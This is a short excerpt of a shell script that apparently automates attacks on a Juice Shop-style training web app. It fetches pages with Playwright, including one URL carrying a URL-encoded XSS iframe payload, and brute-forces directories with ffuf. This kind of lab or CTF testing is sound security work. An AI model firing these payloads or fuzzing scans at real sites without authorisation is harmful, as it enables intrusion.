...
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E" > $result_folder/1-xss1.html
...
# All dirs are configured to answer 200. Gobuster enable removal of no data dirs while nmap returns all possible dirs. 
$scriptpath/../../tools/ffuf.sh -u $target_ip -t 200 -m big.txt -a "-fs 1926,0" -o $result_folder/1-ffuf.txt
...
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/privacy-security/privacy-policy" > $result_folder/1-policy.html
...
node $scriptpath/../../tools/playwright.js "http://$target_ip/#/score-board" > $result_folder/1-score.html
